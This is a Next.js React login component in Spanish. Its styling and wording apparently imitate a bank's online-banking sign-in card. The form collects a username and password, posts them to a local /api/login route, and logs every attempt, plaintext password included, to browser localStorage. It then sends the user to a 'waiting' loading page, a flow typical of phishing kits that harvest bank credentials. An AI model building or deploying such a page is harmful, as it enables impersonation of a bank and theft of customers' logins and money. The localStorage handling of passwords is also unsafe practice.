"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function AuthForm() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [usernameFocused, setUsernameFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [message, setMessage] = useState("");
  const [status, setStatus] = useState("");

  useEffect(() => {
    const savedLast = localStorage.getItem("svpLastSubmission");
    if (savedLast) {
      const parsed = JSON.parse(savedLast);
      if (parsed?.username) setUsername(parsed.username);
    }
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus("loading");
    setMessage("Verificando credenciales...");

    const payload = { username, password, flow: "LOGIN", timestamp: new Date().toISOString() };

    const saveSubmission = (resultStatus) => {
      const submissions = JSON.parse(localStorage.getItem("svpSubmissions") || "[]");
      submissions.push({ ...payload, status: resultStatus });
      localStorage.setItem("svpSubmissions", JSON.stringify(submissions));
      localStorage.setItem("svpLastSubmission", JSON.stringify(payload));
    };

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();

      if (res.ok) {
        setStatus("success");
        setMessage(data.message || "Inicio de sesión exitoso");
        router.push(`/loading?next=waiting&user=${encodeURIComponent(username)}`);
      } else {
        setStatus("error");
        setMessage(data.message || "Error de autenticación");
      }

      saveSubmission(data.status || (res.ok ? "success" : "error"));
    } catch (err) {
      setStatus("error");
      setMessage("No se pudo conectar al servidor.");
      saveSubmission("error");
    }
  };

  return (
    <div className="bc-card-body bc-mt-4">
      <bc-card-authentication
        titlecardauth="¡Hola!"
        aria-label="Hola. Ingresa los datos para gestionar tus productos y hacer transacciones."
        descriptioncardauth="Ingresa los datos para gestionar tus productos y hacer transacciones."
        amountofbuttons="one"
        typecontainerauth="staticContainer"
      >
        <section id="card1" className="bc-card bc-card-auth bc-card-container">
          <section id="id00" className="bc-card-auth-body">
            <section className="bc-card-auth-head">
              <section>
                <em aria-hidden="true" className="bc-icon"></em>
              </section>
              <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">¡Hola!</h1>
              <h3 className="bc-card-auth-description bc-mt-3">
                Ingresa los datos para gestionar tus productos y hacer transacciones.
              </h3>
            </section>

            <form onSubmit={handleSubmit} noValidate className="bc-untouched bc-pristine bc-valid">
              <section className="bc-card-auth-container">
                <bc-form-field className="authentication-form__username">
                  <div className={`auth-field ${username || usernameFocused ? "filled" : ""}`}>
                    <em aria-hidden="false">user</em>
                    <input
                      id="username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      onFocus={() => setUsernameFocused(true)}
                      onBlur={() => setUsernameFocused(false)}
                      type="text"
                      autoComplete="off"
                      spellCheck="false"
                      maxLength={20}
                      aria-label="Ingresa usuario"
                      placeholder=" "
                      className="auth-input"
                    />
                    <label
                      htmlFor="username"
                      className="auth-label"
                      style={{
                        transform: username || usernameFocused ? "translateY(-0.7rem) scale(0.85)" : "translateY(0) scale(1)",
                        color: username || usernameFocused ? "#f8c400" : "rgba(255, 255, 255, 0.7)",
                        fontSize: username || usernameFocused ? "0.82rem" : "0.95rem"
                      }}
                    >
                      Usuario
                    </label>
                  </div>
                </bc-form-field>

                <bc-form-field className="authentication-form__password">
                  <div className={`auth-field ${password || passwordFocused ? "filled" : ""}`}>
                    <em aria-hidden="false">lock</em>
                    <input
                      id="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      onFocus={() => setPasswordFocused(true)}
                      onBlur={() => setPasswordFocused(false)}
                      type="password"
                      autoComplete="off"
                      maxLength={20}
                      aria-label="Ingresa contraseña"
                      placeholder=" "
                      className="auth-input"
                    />
                    <label
                      htmlFor="password"
                      className="auth-label"
                      style={{
                        transform: password || passwordFocused ? "translateY(-0.7rem) scale(0.85)" : "translateY(0) scale(1)",
                        color: password || passwordFocused ? "#f8c400" : "rgba(255, 255, 255, 0.7)",
                        fontSize: password || passwordFocused ? "0.82rem" : "0.95rem"
                      }}
                    >
                      Contraseña
                    </label>
                  </div>
                </bc-form-field>
              </section>

              <section className="bc-card-auth-button">
                <button
                  type="submit"
                  className="bc-button bc-button-fill bc-button-primary"
                  disabled={status === "loading"}
                >
                  {status === "loading" ? "Cargando..." : "Iniciar sesión"}
                </button>
              </section>

              <section className="auth-status-message">
                {message && (
                  <p className={`auth-message ${status}`}>{message}</p>
                )}
              </section>
            </form>

            <section className="bc-card-auth-link">
              <a href="#" className="bc-link link-default link-underline">
                <u>Crear usuario</u>
              </a>
            </section>
          </section>
        </section>
      </bc-card-authentication>

      <style jsx>{`
        .auth-field {
          position: relative;
          margin-bottom: 1rem;
        }

        .auth-input {
          width: 100%;
          padding: 1rem 0.75rem 0.5rem;
          background: rgba(0, 0, 0, 0.15);
          border: 1px solid rgba(255, 255, 255, 0.35);
          border-radius: 0.75rem;
          color: #fff;
        }

        .auth-label {
          position: absolute;
          left: 0.75rem;
          top: 0.9rem;
          color: rgba(255, 255, 255, 0.7);
          font-size: 0.95rem;
          pointer-events: none;
          transition: all 0.15s ease-in-out;
          background: transparent;
          padding: 0 0.2rem;
          transform-origin: left top;
        }

        .auth-field.filled .auth-label,
        .auth-field .auth-input:focus + .auth-label {
          transform: translateY(-0.7rem) scale(0.85);
          color: #f8c400;
          font-size: 0.82rem;
        }

        .auth-input:focus {
          outline: none;
          border-color: #f8c400;
          box-shadow: 0 0 0 0.15rem rgba(248, 196, 0, 0.30);
        }
      `}</style>
    </div>
  );
}
